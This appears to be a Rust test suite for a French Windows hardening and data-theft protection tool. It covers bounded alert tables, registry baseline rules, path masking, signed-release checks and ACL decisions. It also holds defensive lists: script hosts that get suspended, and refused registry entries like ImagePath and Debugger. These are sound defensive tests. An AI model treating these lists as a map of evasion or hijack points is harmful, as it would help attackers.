    assert!(origine_a_garder(&None), "pas de chemin : rien à relire");
    assert!(origine_a_garder(&Some(Origine { zone: 3, ..Default::default() })), "marque lue : gardée");
    assert!(origine_a_garder(&Some(Origine::default())), "sans marque, lue à temps : gardée");
    assert!(!origine_a_garder(&Some(Origine { hors_delai: true, ..Default::default() })), "hors délai : relue au passage suivant");
}

/// S175-04 : plafond par profil appliqué pendant l'énumération, avant la lecture du manifeste ; troncature signalée
#[test]
fn audit_s175_04_plafond_par_profil() {
    let a = crate::hygiene::alerte_inventaire_tronque(7);
    assert_eq!(a.regle, "EXT-001");
    assert_eq!(a.niveau, "Alerte");
    assert!(a.raisons.contains("PARTIEL") && a.raisons.contains("7 extension(s)"), "{}", a.raisons);
    let h = include_str!("hygiene.rs");
    let i = &h[h.find("pub(crate) fn inventaire_extensions_borne()").unwrap()..];
    let i = &i[..i.find("\n}").unwrap()];
    assert!(i.contains("let debut_profil = l.len();"), "compte par profil");
    let chrome = &i[i.find("for ext in exts").unwrap()..];
    assert!(chrome.find("MAX_EXTENSIONS_PAR_PROFIL").unwrap() < chrome.find("lire_profil_borne").unwrap(), "plafond avant la lecture du manifeste");
    assert!(chrome.find("examines += 1;").unwrap() < chrome.find("read_dir(ext.path())").unwrap() && chrome.contains("examines > MAX_DOSSIERS_PAR_PROFIL"), "dossiers examinés comptés avant toute lecture (S175-07)");
    let v = &h[h.find("pub fn verifier_extensions()").unwrap()..];
    assert!(v.contains("if tronquees > 0 {") && v.contains("alerte_inventaire_tronque(tronquees)"), "troncature signalée");
}

// ------------------------------------------------------------ audit du 2026-11-14, lot 3 (tables bornées)

/// A6, A7, S176-01 : budget par catégorie, une synthèse par catégorie ; une inondation d'une catégorie ne tait pas les
/// autres (usurpation de passerelle après une inondation d'options DHCP)
#[test]
fn audit_a6_a7_admission_plafonnee() {
    use crate::commun::{admettre_cle, Admission};
    use std::time::Duration;
    let mut deja = std::collections::HashMap::new();
    let h = Duration::from_secs(3600);
    for i in 0..3 {
        assert_eq!(admettre_cle(&mut deja, format!("dhcp|10.0.0.{i}"), h, 3), Admission::Nouvelle);
    }
    assert_eq!(admettre_cle(&mut deja, "dhcp|10.0.0.1".into(), h, 3), Admission::Deja, "clé déjà vue");
    assert_eq!(admettre_cle(&mut deja, "dhcp|10.0.0.9".into(), h, 3), Admission::PlafondAtteint("dhcp".into()), "synthèse de la catégorie");
    for i in 10..1000 {
        assert_eq!(admettre_cle(&mut deja, format!("dhcp|10.0.{i}.1"), h, 3), Admission::PlafondDejaSignale, "plus rien dans cette catégorie");
    }
    assert_eq!(admettre_cle(&mut deja, "arp-double|10.0.0.254".into(), h, 3), Admission::Nouvelle, "les autres catégories restent signalées (S176-01)");
    assert_eq!(admettre_cle(&mut deja, "ja3|abc".into(), h, 3), Admission::Nouvelle);
    assert!(deja.len() <= 6, "table bornée : {}", deja.len());
    // S176-04 : une catégorie maintenue sous son budget ne fait pas grossir la table sans fin (clés expirées purgées)
    let mut deja = std::collections::HashMap::new();
    for i in 0..10_000 {
        admettre_cle(&mut deja, format!("port|{i}"), Duration::ZERO, 100);
    }
    assert!(deja.len() <= 100 * 16 + 1, "table purgée : {}", deja.len());
    let mut deja = std::collections::HashMap::new();
    for i in 0..3 {
        admettre_cle(&mut deja, format!("port|k{i}"), Duration::ZERO, 3);
    }
    assert_eq!(admettre_cle(&mut deja, "port|neuve".into(), Duration::ZERO, 3), Admission::Nouvelle, "clés expirées : place libre");
}

/// A5 : files de corrélation bornées par clé et en nombre de clés ; la clé la moins récente est oubliée
#[test]
fn audit_a5_files_de_correlation_bornees() {
    use crate::siem::{borner_cles, MAX_CLES};
    use std::collections::{HashMap, VecDeque};
    use std::time::Instant;
    let mut t: HashMap<String, VecDeque<(Instant, String)>> = HashMap::new();
    for i in 0..MAX_CLES {
        t.insert(format!("10.0.{}.{}", i / 250, i % 250), VecDeque::from([(Instant::now(), String::new())]));
    }
    let la_plus_vieille = "10.0.0.0".to_string();
    t.get_mut(&la_plus_vieille).unwrap()[0].0 = Instant::now().checked_sub(std::time::Duration::from_secs(60)).unwrap();
    borner_cles(&mut t, "203.0.113.5", |f| f.back().map(|x| x.0));
    assert!(t.len() < MAX_CLES && !t.contains_key(&la_plus_vieille), "place faite pour une source nouvelle");
    // S176-02 : une inondation de comptes locaux n'évince pas la file d'une adresse distante (plusieurs échecs)
    let mut t: HashMap<String, VecDeque<(Instant, String)>> = HashMap::new();
    let ancien = Instant::now().checked_sub(std::time::Duration::from_secs(120)).unwrap();
    t.insert("203.0.113.7".into(), VecDeque::from(vec![(ancien, String::new()); 4]));
    for i in 0..MAX_CLES - 1 {
        t.insert(format!("compte essai{i}"), VecDeque::from([(Instant::now(), String::new())]));
    }
    for i in 0..3 * MAX_CLES {
        let cle = format!("compte inondation{i}");
        borner_cles(&mut t, &cle, |f| f.back().map(|x| x.0));
        t.entry(cle).or_default().push_back((Instant::now(), String::new()));
    }
    assert_eq!(t.get("203.0.113.7").map(|f| f.len()), Some(4), "file de l'adresse distante gardée (S176-02)");
    assert!(t.len() <= MAX_CLES);
    let s = include_str!("siem.rs");
    assert!(s.matches("while file.len() > MAX_PAR_CLE").count() == 2, "files bornées par clé (échecs, alertes par programme)");
}

#[test]
fn baseline_u_textes_et_bureau_distance() {
    // Relecture de la baseline du 2026-11-20, bloc U et T2 : les effets sur l'usage du poste sont dits, et la règle qui
    // coupe le Bureau à distance n'est pas emportée par le profil entier quand il est en service
    use crate::baseline::{retirer_bureau_distance, REGLES};
    // U1 : décision pure
    assert!(retirer_bureau_distance(5, Some(true)), "profil entier, RDP actif : laissée de côté");
    assert!(retirer_bureau_distance(5, None), "profil entier, état illisible : laissée de côté");
    assert!(!retirer_bureau_distance(5, Some(false)), "profil entier, RDP coupé : appliquée");
    assert!(!retirer_bureau_distance(1, Some(true)), "seule : choix explicite, appliquée");
    // T2 : chaque règle qui change l'usage du poste le dit
    for id in ["reseau.bureau-distance", "systeme.uac", "reseau.invite-smb", "systeme.lsa"] {
        let r = REGLES.iter().find(|r| r.id == id).unwrap_or_else(|| panic!("{id} absente"));
        assert!(!r.compat.trim().is_empty(), "{id} : compatibilité vide");
    }
    // U3 : les réglages Defender posés par stratégie disent l'effet sur Sécurité Windows
    for r in REGLES.iter().filter(|r| r.id.starts_with("defender.") && r.mecanismes.iter().any(|m| matches!(m, crate::baseline::Mecanisme::Registre { .. }))) {
        assert!(r.compat.contains("géré par votre organisation"), "{} : effet sur Sécurité Windows non dit", r.id);
    }
    // U4, U5 : la confirmation du profil et l'en-tête ne promettent plus « sans effet de bord »
    let src = include_str!("baseline.rs");
    assert!(!src.contains("sans effet de bord notable"));
    assert!(src.contains("if regles.iter().any(|r| r.id == \"reseau.bureau-distance\") && retirer_bureau_distance(demandees, bureau_distance_actif())"));
    let gui = include_str!("../../src/Gui.cs");
    let q = gui.lines().find(|l| l.contains("QuestionRecommande =")).expect("question du profil");
    assert!(q.contains("Bureau à distance") && q.contains("élévation") && q.contains("invité"), "effets dits dans la confirmation");
    let langue = include_str!("../../src/Langue.cs");
    assert!(langue.contains("Remote Desktop is turned off"), "traduction de la confirmation");
}

#[test]
fn baseline_s218_valeur_plus_stricte_et_journal_jamais_reduit() {
    // Audit de #218 : RunAsPPL = 1 déjà en place n'est pas remplacé par 2 (S218-01) ; un journal plus grand que la
    // cible n'est jamais réduit (S218-02) ; le canal remis à l'annulation est celui de la règle (S218-03)
    use crate::baseline::{deja_plus_stricte, taille_a_poser, Valeur::Dword};
    assert!(deja_plus_stricte("RunAsPPL", &Dword(2), Some("1")), "verrou UEFI déjà choisi : gardé");
    assert!(!deja_plus_stricte("RunAsPPL", &Dword(2), Some("2")));
    assert!(!deja_plus_stricte("RunAsPPL", &Dword(2), Some("0")));
    assert!(!deja_plus_stricte("RunAsPPL", &Dword(2), None));
    assert!(!deja_plus_stricte("RunAsPPL", &Dword(2), Some("abc")));
    assert!(taille_a_poser(20 * 1024 * 1024, 1_048_576), "20 Mo < 1 Go : à poser");
    assert!(!taille_a_poser(1_073_741_824, 1_048_576), "déjà 1 Go : rien");
    assert!(!taille_a_poser(4 * 1_073_741_824, 1_048_576), "4 Go : jamais réduit");
    let src = include_str!("baseline.rs");
    assert!(src.contains("if a_poser && ecriture_retenue(cle, nom, valeur, &autres) && !deja_plus_stricte(nom, valeur, lire_registre(cle, nom).as_deref()) {"));
    assert!(src.contains("if lire_taille_journal(canal).map(|t| taille_a_poser(t, *ko)).unwrap_or(false) {"), "forcer_tailles ne réduit jamais");
    assert!(src.contains("if !deja_assez_grands.contains(&canal) {"));
    assert!(src.contains(".filter(|_| canal_de_la_regle)"), "canal recoupé avec la règle");
}

#[test]
fn baseline_s219_strategie_de_taille_abaissee_jamais_masquee() {
    // Audit de #219, S219-01 : une stratégie de taille présente mais plus petite que la cible n'est jamais masquée par
    // la taille effective, et elle est réécrite à l'application
    use crate::baseline::strategie_taille_a_ecrire;
    let un_go = 1_073_741_824u64;
    assert!(strategie_taille_a_ecrire(un_go, 1_048_576, Some("20480")), "stratégie abaissée à 20 Mo, journal encore à 1 Go : réécrite");
    assert!(!strategie_taille_a_ecrire(un_go, 1_048_576, None), "pas de stratégie, journal assez grand : rien");
    assert!(strategie_taille_a_ecrire(20 * 1024 * 1024, 1_048_576, None), "pas de stratégie, journal trop petit : écrite");
    assert!(!strategie_taille_a_ecrire(un_go, 1_048_576, Some("1048576")), "stratégie à la cible : rien de plus");
    assert!(strategie_taille_a_ecrire(un_go, 1_048_576, Some("abc")), "stratégie illisible : réécrite");
    let src = include_str!("baseline.rs");
    assert!(src.contains("a_poser = strategie_taille_a_ecrire(taille, *ko, lire_registre(cle, nom).as_deref());"));
    assert!(src.contains("                if actuel.is_none() {"), "taille effective prise seulement sans stratégie");
    // S219-03 : la stratégie du Bureau à distance est lue avant la clé système
    assert!(src.contains(r#"lire(r"SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services").or_else(|| lire(r"SYSTEM\CurrentControlSet\Control\Terminal Server"))?"#));
    // S219-02 : destination stable
    assert!(src.contains("a.destination = \"baseline : réglages Defender\".into();"));
}

#[test]
fn baseline_d1_d2_prerelecture_219() {
    // D1 : la conformité par la taille effective, extraite en décision pure
    use crate::baseline::conforme_par_taille_effective;
    let un_go = 1_073_741_824u64;
    assert!(conforme_par_taille_effective(None, Some(un_go), 1_048_576), "sans stratégie, 1 Go pour 1 Go : conforme");
    assert!(conforme_par_taille_effective(None, Some(4 * un_go), 1_048_576), "plus grand : conforme");
    assert!(!conforme_par_taille_effective(None, Some(20 * 1024 * 1024), 1_048_576), "plus petit : jamais conforme");
    assert!(!conforme_par_taille_effective(None, None, 1_048_576), "taille illisible : jamais conforme");
    assert!(!conforme_par_taille_effective(Some("20480"), Some(un_go), 1_048_576), "stratégie présente : jamais par ce chemin");
    let src = include_str!("baseline.rs");
    assert!(src.contains("if conforme_par_taille_effective(actuel.as_deref(), t, *ko) {"));
    // D2 : les écartements comptent les règles demandées ; tout écarté = rien d'écrit
    assert!(src.contains("retirer_lsa(demandees, lsa_applicable(build_windows()))?"));
    assert!(src.contains("retirer_bureau_distance(demandees, bureau_distance_actif())"));
    assert!(!src.contains("retirer_bureau_distance(regles.len(), bureau_distance_actif())"));
    assert!(src.contains("return Ok(format!(\"Aucune règle appliquée.{note}\"));"));
}

#[test]
fn baseline_t3_annulation_rend_les_valeurs_d_origine_apres_gpupdate() {
    // Passage T3 en VM du 2026-11-20 : l'annulation de systeme.uac effaçait les valeurs d'origine, remises avant la
    // mise à jour des stratégies qui les retire ; elles sont remises et relues après (limite S215-05 levée)
    use crate::baseline::{strategie_taille_a_ecrire, valeur_remise, valeur_satisfaite, Valeur::Dword};
    assert!(valeur_remise("5", Some("5")) && valeur_remise("1", Some(" 1 ")));
    assert!(!valeur_remise("5", None), "effacée : non remise");
    assert!(!valeur_remise("5", Some("2")));
    let src = include_str!("baseline.rs");
    let d = src.find("pub fn annuler(").unwrap();
    let corps = &src[d..];
    let gp = corps.find("etapes.push((\"mise à jour des stratégies (gpupdate)\"").expect("gpupdate");
    let rm = corps.find("let pas_remises = remettre_valeurs(&valeurs_a_remettre);").expect("remise après gpupdate");
    assert!(rm > gp, "valeurs d'origine remises après gpupdate");
    assert!(corps.contains("valeurs_a_remettre.retain(|(c, nm, _, _, _)| !ajouts.iter()"), "réglage partagé encore utilisé : non remis");
    // S219-05 : une stratégie de taille plus grande que la cible satisfait la règle et n'est jamais abaissée
    assert!(valeur_satisfaite("MaxSize", &Dword(1_048_576), Some("2097152")));
    assert!(!valeur_satisfaite("MaxSize", &Dword(1_048_576), Some("20480")));
    assert!(!strategie_taille_a_ecrire(20 * 1024 * 1024, 1_048_576, Some("2097152")), "2 Go posés : jamais réécrits à 1 Go");
    assert!(strategie_taille_a_ecrire(1_073_741_824, 1_048_576, Some("20480")), "abaissée : réécrite");
}

#[test]
fn baseline_s220_entree_etrangere_refusee_et_type_garde() {
    // Audit de #220 : une entrée de la sauvegarde étrangère à la règle n'est jamais écrite (S220-01) ; une valeur
    // texte du catalogue (règle ASR) est remise en texte (S220-02)
    use crate::baseline::{mecanisme_de, Valeur::Texte, REGLES};
    let uac = REGLES.iter().find(|r| r.id == "systeme.uac").unwrap();
    assert!(mecanisme_de(uac, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "enablelua").is_some(), "casse ignorée");
    assert!(mecanisme_de(uac, r"SYSTEM\CurrentControlSet\Services\X", "ImagePath").is_none(), "clé étrangère refusée");
    assert!(mecanisme_de(uac, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "Debugger").is_none(), "nom étranger refusé");
    let asr = REGLES.iter().find(|r| r.id == "asr.courriel").unwrap();
    let texte = asr.mecanismes.iter().find_map(|m| match m { crate::baseline::Mecanisme::Registre { cle, nom, valeur: Texte(_) } => Some((*cle, *nom)), _ => None }).expect("mécanisme texte");
    assert!(matches!(mecanisme_de(asr, texte.0, texte.1), Some(Texte(_))), "type texte connu");
    let src = include_str!("baseline.rs");
    assert!(src.contains("let Some(catalogue) = mecanisme_de(r, cle, nom) else {"));
    assert!(src.contains("(false, Ok(d)) => k.set_value(nom, &d).is_ok(),"), "texte jamais converti en nombre");
}

#[test]
fn baseline_d1_d2_prerelecture_220() {
    // D2 : la remise exige l'écriture ET la bonne valeur relue
    use crate::baseline::remise_reussie;
    assert!(remise_reussie(true, "1", Some("1")));
    assert!(!remise_reussie(false, "1", Some("1")), "écriture en échec : jamais réussie");
    assert!(!remise_reussie(true, "1", Some("0")), "mauvaise valeur relue");
    assert!(!remise_reussie(true, "1", None), "valeur absente");
    let src = include_str!("baseline.rs");
    assert!(src.contains("!remise_reussie(ecrit, v, lire_registre(cle, nom).as_deref())"));
    // D1 : une remise en échec remet la règle dans la sauvegarde et dit la valeur d'origine
    assert!(src.contains("sauvegarde.regles.insert(id.to_string(), o.clone());"));
    assert!(src.contains("let gardee = match ecrire_sauvegarde(&sauvegarde) {"));
    assert!(src.contains(r#"format!("{}\\{} = {}", x.0, x.1, commun::masquer_chemin(&x.2))"#), "valeur d'origine dans le message, chemin masqué");
}

#[test]
fn baseline_s220_03_et_04_messages() {
    // Audit de #220 : l'entrée étrangère est citée (S220-03) ; la valeur d'origine dite a son chemin de profil masqué
    // (S220-04)
    use crate::baseline::message_non_remises;
    assert_eq!(message_non_remises(&[], &[]), "");
    let m = message_non_remises(&["systeme.uac"], &["systeme.uac : SYSTEM\\X\\ImagePath".to_string()]);
    assert!(m.contains("non remise pour : systeme.uac"), "{m}");
    assert!(m.contains("étrangère(s) à la règle") && m.contains("SYSTEM\\X\\ImagePath"), "{m}");
    let src = include_str!("baseline.rs");
    assert!(src.contains("etrangeres.push(commun::borner_texte(&format!("));
    assert!(src.contains("commun::masquer_chemin(&x.2)"));
    assert_eq!(crate::commun::masquer_chemin(r"C:\Users\quelquun\journaux\x.evtx"), r"%USERPROFILE%\journaux\x.evtx");
}

#[test]
fn masquage_s221_toutes_les_formes_de_profil_et_texte_borne() {
    // Audit de #221 : toutes les formes d'un dossier de profil sont masquées, où qu'elles soient (S221-01) ; un texte
    // venu de la sauvegarde est borné (S221-02)
    use crate::commun::{borner_texte, masquer_chemin};
    let p = "%USERPROFILE%";
    assert_eq!(masquer_chemin(r"C:\Users\marie\a.txt"), format!(r"{p}\a.txt"));
    assert_eq!(masquer_chemin("C:/Users/marie/a.txt"), format!("{p}/a.txt"));
    assert_eq!(masquer_chemin(r"\\?\C:\Users\marie\a.txt"), format!(r"{p}\a.txt"));
    assert_eq!(masquer_chemin(r"%SystemDrive%\Users\marie\a.txt"), format!(r"{p}\a.txt"));
    assert_eq!(masquer_chemin(r"journal = D:\users\Marie Curie"), format!("journal = {p}"), "nom de profil avec espace masqué en entier");
    assert_eq!(masquer_chemin(r"a C:\Users\x\b ; C:\Users\y\c"), format!(r"a {p}\b ; {p}\c"), "toutes les occurrences");
    assert_eq!(masquer_chemin(r"C:\Program Files\App\a.exe"), r"C:\Program Files\App\a.exe");
    assert_eq!(masquer_chemin(r"C:\Users"), r"C:\Users", "dossier racine seul : rien à masquer");
    let long = "x".repeat(10_000);
    let b = borner_texte(&long, 200);
    assert_eq!(b.chars().count(), 201, "200 caractères et l'ellipse");
    assert_eq!(borner_texte(r"C:\Users\marie\k", 200), format!(r"{p}\k"));
    let m = crate::baseline::message_non_remises(&[], &(0..8).map(|i| format!("r{i}")).collect::<Vec<_>>());
    assert!(m.contains("r4") && !m.contains("r5") && m.contains("et 3 autre(s)"), "{m}");
    crate::tests::torturer_texte(r"\\?\C:\Users\marie\x", &mut |t| { let _ = masquer_chemin(t); let _ = borner_texte(t, 10); });
}


#[test]
fn publication_echec_ferme_sans_signature_epinglee() {
    // Plan avant la première version signée, bloc 0.1 (2026-11-21) : un tag v* ne publie rien si le MSI et les deux
    // exécutables ne portent pas une signature valide, horodatée, d'une clé de CLE_SIGNATURE
    let wf = include_str!("../../.github/workflows/publication.yml");
    let verif = wf.find("./verifier-signatures.ps1 -Cles \"$env:CLES\" -Fichiers bin/deR4Tizer.msi, bin/deR4TizerSvc.exe, bin/deR4Tizer.exe").expect("vérification des signatures");
    let envoi = wf.find("name: version").expect("artefact transmis à « publier »");
    assert!(verif < envoi, "vérification avant la transmission des fichiers");
    assert!(!wf[verif - 300..verif].contains("if:"), "la vérification n'est jamais sautée");
    let publier = wf.find("  publier:").expect("job publier");
    assert!(wf[publier..].contains("needs: signer"), "publier dépend de signer");
    let s = include_str!("../../verifier-signatures.ps1");
    assert!(s.contains("if ($liste.Count -eq 0 -or $invalides.Count)"), "clés vides ou invalides : refus");
    assert!(s.contains("if ($s.Status -ne 'Valid')") && s.contains("TimeStamperCertificate") && s.contains("if ($cle -notin $liste)"));
    assert!(s.contains("PublicKey.EncodedKeyValue.RawData"), "même empreinte que natif::cle_signataire_verifiee");
}

#[test]
fn publication_aucun_nom_de_titulaire_dans_le_journal() {
    // Prérelecture de #226 : le journal de GitHub Actions est public ; le script n'écrit jamais le sujet ni
    // l'émetteur du certificat (le nom du titulaire), seulement l'empreinte de la clé
    let s = include_str!("../../verifier-signatures.ps1");
    for interdit in [".Subject", ".Issuer", "FriendlyName", "GetNameInfo"] {
        assert!(!s.contains(interdit), "{interdit} dans la sortie possible du script");
    }
}

#[test]
fn publication_tag_jamais_insere_et_revocation_verifiee() {
    // Audit de #226 : le nom du tag ne passe que par l'environnement et doit être vX.Y(.Z) (S226-01) ; publier exige
    // l'environnement « publication » (S226-02) ; la révocation est vérifiée en ligne, inconnu = refus (S226-03)
    let wf = include_str!("../../.github/workflows/publication.yml");
    let hors_env: Vec<&str> = wf.lines().filter(|l| l.contains("${{ github.ref_name }}") && !l.trim_start().starts_with("REF:")).collect();
    assert!(hors_env.is_empty(), "nom du tag inséré dans un script : {hors_env:?}");
    assert!(wf.matches(r"-cnotmatch '^v\d+\.\d+(\.\d+)?$'").count() >= 2, "forme du tag validée avant le manifeste");
    assert!(wf.contains(r#"[[ "$REF" =~ ^v[0-9]+\.[0-9]+(\.[0-9]+)?$ ]]"#), "forme du tag validée dans publier");
    let publier = wf.find("  publier:").unwrap();
    assert!(wf[publier..].contains("environment: publication"), "approbation exigée pour publier");
    let s = include_str!("../../verifier-signatures.ps1");
    assert!(s.contains("X509RevocationMode]::Online") && s.contains("X509RevocationFlag]::EntireChain"));
}

#[test]
fn publication_chaine_par_liste_d_acceptation_et_essai_reel() {
    // Revue externe du 2026-11-21, défaut 1 : seuls NoError et NotTimeValid (signature horodatée) passent ; tout autre
    // état de la chaîne refuse. Défaut 2 : le script est exécuté dans la CI (maj.ps1) sur de vrais paquets signés
    let s = include_str!("../../verifier-signatures.ps1");
    assert!(s.contains("$autres = @($etats | Where-Object { $_ -notin 'NoError', 'NotTimeValid' })"), "liste d'acceptation");
    assert!(s.contains("if ($autres.Count -or (-not $ok -and -not $seulExpire))"), "échec de construction sans seul « expiré » : refus");
    assert!(!s.contains("$bloquants"), "plus de liste de refus");
    assert!(s.contains("$seulExpire = $etats -contains 'NotTimeValid' -and $autres.Count -eq 0"), "Build faux : NotTimeValid exigé (S233-01)");
    let m = include_str!("../../tests/integration/maj.ps1");
    assert!(m.contains("@('pwsh.exe', 'powershell.exe')") && m.contains("codes différents selon l'hôte"), "les deux hôtes PowerShell (S233-02)");
    for cas in ["liste de clés vide, refus", "fichier non signé, refus", "clé non épinglée, horodatée, refus", "clé épinglée sans horodatage, refus",
        "certificat révoqué, horodaté, refus", "CRL injoignable, horodaté, refus", "clé épinglée, horodaté, chaîne et révocation vérifiées, accepté (code 0)"] {
        assert!(m.contains(&format!("'Publication : {cas}")), "cas d'essai réel absent : {cas}");
    }
    // Par -Command : une liste vide passée par -File arrive comme un argument manquant (prérelecture de #233, D1)
    assert!(m.contains("-Command \"& '$verifierSig' -Cles '$Cles' -Fichiers '$Fichier'; exit `$LASTEXITCODE\""), "le script lui-même est exécuté");
    assert!(m.contains("$horoAutre = Horodate \"$Nouvelle-autre\" 'autre'"), "clé non épinglée horodatée : la clé est bien comparée");
    assert!(m.contains("NonExecute \"Publication : script sous $h\""), "hôte absent dit (S233-03)");
}

#[test]
fn s110_14_droits_compte_et_hotes_de_scripts() {
    // Décision du mainteneur du 2026-11-21 (S110-14, S113-10, S114-01, S114-02)
    use crate::natif::{Ace, Securite};
    use crate::politique::{chemins_a_controler, genre_suspension_garanti as g, ouvert_en_ecriture as o, Genre::*};
    let ace = |sid: &str, masque: u32, autorise: bool| Ace { autorise, masque, sid: sid.into() };
    let sec = |aces: Vec<Ace>| Securite { proprietaire: "S-1-5-18".into(), protege: false, aces, ace_inconnue: false };
    // Droits : lecture seule pour Utilisateurs = fermé ; écriture pour Utilisateurs, Utilisateurs authentifiés, Tout le monde = ouvert
    assert!(!o(Some(&sec(vec![ace("S-1-5-32-545", 0x1200a9, true), ace("S-1-5-18", 0x1f01ff, true), ace("S-1-5-32-544", 0x1f01ff, true)]))));
    for sid in ["S-1-5-32-545", "S-1-5-11", "S-1-1-0", "S-1-5-4"] {
        assert!(o(Some(&sec(vec![ace(sid, 0x2, true)]))), "écriture pour {sid}");
        assert!(o(Some(&sec(vec![ace(sid, 0x1000_0000, true)]))), "GENERIC_ALL pour {sid}");
        assert!(!o(Some(&sec(vec![ace(sid, 0x2, false)]))), "refus : pas une ouverture");
    }
    assert!(o(Some(&sec(vec![ace("S-1-5-32-545", 0x40000, true)]))), "changer les droits = ouvert");
    assert!(o(None), "droits illisibles = ouvert");
    assert!(o(Some(&Securite { ace_inconnue: true, ..sec(vec![]) })), "entrée non reconnue = ouvert");
    assert!(!o(Some(&sec(vec![ace("S-1-3-0", 0x1000_0000, true)]))), "CREATOR OWNER ne compte pas");
    // Chemins contrôlés : le fichier, puis chaque dossier jusqu'à la racine exclue
    assert_eq!(chemins_a_controler(r"C:\Program Files (x86)\Editeur\bin\app.exe", r"C:\Program Files (x86)"),
               vec![r"C:\Program Files (x86)\Editeur\bin\app.exe".to_string(), r"C:\Program Files (x86)\Editeur\bin".into(), r"C:\Program Files (x86)\Editeur".into()]);
    assert_eq!(chemins_a_controler(r"C:\Program Files\app.exe", r"C:\Program Files\"), vec![r"C:\Program Files\app.exe".to_string()]);
    // Seuil : seulement fermé ET privilégié
    let d = [r"C:\Program Files".to_string()];
    let p = r"C:\Program Files\Editeur\app.exe";
    assert_eq!(g(p, true, &d, true, true), Suspension);
    assert_eq!(g(p, true, &d, false, true), SuspensionSansSeuil, "dossier ouvert en écriture");
    assert_eq!(g(p, true, &d, true, false), SuspensionSansSeuil, "compte de l'utilisateur");
    // Hôtes de scripts ajoutés : jamais de seuil
    for h in ["dotnet.exe", "DENO.EXE", "bun.exe", "lua.exe", "Rscript.exe", "julia.exe", "AutoHotkey64.exe", "AutoIt3.exe", "MSBuild.exe", "csi.exe"] {
        assert_eq!(g(&format!(r"C:\Program Files\X\{h}"), true, &d, true, true), SuspensionSansSeuil, "{h}");
    }
}

#[test]
fn s110_14_connu_seulement_garanti() {
    use crate::vol_donnees::leurre_connu_garanti as c;
    let d = dossiers_de_test();
    let oui = |_: &[&str]| true;
    let ferme = |_: &str| true;
    let ouvert = |_: &str| false;
    let p = r"C:\Program Files\Veeam\VeeamAgent.exe";
    let vrai = || true;
    let faux = || false;
    assert!(c(p, &d, &oui, &ferme, &vrai));
    assert!(!c(p, &d, &oui, &ouvert, &vrai), "dossier ouvert en écriture : jamais connu");
    assert!(!c(p, &d, &oui, &ferme, &faux), "compte de l'utilisateur : jamais connu");
    let lus = std::cell::Cell::new(0);
    let compte = |_: &str| { lus.set(lus.get() + 1); true };
    let jetons = std::cell::Cell::new(0);
    let jeton = || { jetons.set(jetons.get() + 1); true };
    assert!(!c(r"C:\Users\x\AppData\Local\Temp\veeamagent.exe", &d, &oui, &compte, &jeton));
    assert_eq!(lus.get(), 0, "droits non lus hors d'un candidat");
    assert_eq!(jetons.get(), 0, "jeton non lu hors d'un candidat (S228-03)");
    let v = include_str!("vol_donnees.rs");
    assert!(v.contains("let connu = leurre_autorise(pid, &programme);"));
    assert!(v.contains("crate::politique::genre_suspension_garanti(programme, signe, &dossiers, ferme, privilegie)"));
}

#[test]
fn s228_01_liste_d_acceptation_des_droits() {
    // Audit de #228, S228-01 : écriture ou propriété hors de SYSTEM, Administrateurs, TrustedInstaller et des comptes de
    // service = ouvert
    use crate::natif::{Ace, Securite};
    use crate::politique::ouvert_en_ecriture as o;
    let ti = "S-1-5-80-956008885-3418522649-1831038044-1853292631-2271478464";
    let ace = |sid: &str, masque: u32| Ace { autorise: true, masque, sid: sid.into() };
    let sec = |prop: &str, aces: Vec<Ace>| Securite { proprietaire: prop.into(), protege: false, aces, ace_inconnue: false };
    let defaut = vec![ace("S-1-5-18", 0x1f01ff), ace("S-1-5-32-544", 0x1f01ff), ace(ti, 0x1f01ff), ace("S-1-5-32-545", 0x1200a9), ace("S-1-3-0", 0x1000_0000), ace("S-1-15-2-1", 0x1200a9)];
    assert!(!o(Some(&sec(ti, defaut.clone()))), "Program Files par défaut : fermé");
    assert!(!o(Some(&sec("S-1-5-80-123-456", defaut.clone()))), "propriétaire compte de service");
    for sid in ["S-1-5-21-1-2-3-1001", "S-1-2-0", "S-1-2-1", "S-1-15-2-1", "S-1-5-19", "S-1-5-80-", "S-1-5-80-0"] {
        let mut a = defaut.clone();
        a.push(ace(sid, 0x2));
        assert!(o(Some(&sec(ti, a))), "écriture pour {sid}");
    }
    assert!(o(Some(&sec("S-1-5-21-1-2-3-1001", defaut.clone()))), "propriétaire utilisateur");
    assert!(o(Some(&sec("", defaut.clone()))), "propriétaire illisible");
}

#[test]
fn reponses_json_illisible_jamais_ecrase_et_ecriture_hors_verrou() {
    // Tri de l'inventaire de la phase 6 (2026-11-21) : S110-13 (fichier présent mais illisible jamais écrasé), S110-04 et
    // S110-16 (lecture et écritures hors du verrou ETAT)
    use crate::politique::{copie_a_ecrire, lecture_test as l, Lecture};
    assert_eq!(l(Lecture::Absent), (false, false, true), "absent : garde vide, fichier écrit");
    assert_eq!(l(Lecture::Refusee), (false, true, false), "lecture refusée : réponse gardée, fichier jamais écrasé");
    assert_eq!(l(Lecture::Texte("{")), (true, false, false), "contenu mal formé : réponse coupée, fichier gardé");
    assert_eq!(l(Lecture::Texte("{}")), (false, false, true));
    assert!(copie_a_ecrire(2, 1) && !copie_a_ecrire(1, 2) && !copie_a_ecrire(3, 3), "jamais une copie plus ancienne");
    let src = include_str!("politique.rs");
    let a = src.find("fn avec_copie<R>(").unwrap();
    let corps = &src[a..a + src[a..].find("\n}\n").or_else(|| src[a..].find("\r\n}\r\n")).unwrap()];
    assert!(corps.contains("drop(g);\n        let (texte, refusee) = lecture_initiale();") || corps.contains("drop(g);\r\n        let (texte, refusee) = lecture_initiale();"), "lecture initiale hors du verrou");
    let rendu = corps.rfind("drop(g);").expect("verrou rendu");
    let depot = corps.find("ecrire_copie(copie);").expect("copie déposée");
    assert!(rendu < depot, "copie déposée après avoir rendu le verrou");
    assert!(!corps.contains("commun::ecrire("), "aucune écriture sous ETAT");
}


#[test]
fn reponses_json_ecrivain_dedie() {
    // Audit de #230 : S230-01, le fil qui note une action ne fait que déposer la copie (aucune écriture sur le disque
    // dans ecrire_copie) ; S230-02, une écriture en échec est remise en attente et réessayée
    let src = include_str!("politique.rs");
    let d = src.find("fn ecrire_copie(").unwrap();
    let f = src[d..].find("fn ecrivain()").unwrap();
    let depot = &src[d..d + f];
    assert!(!depot.contains("commun::ecrire("), "le fil appelant n'écrit pas sur le disque");
    assert!(depot.contains("SIGNAL.notify_one();"));
    let e = &src[d + f..];
    assert!(e.contains("ecrire_registre(&h) };") && e.contains("let ecrite = resultat.is_ok();"));
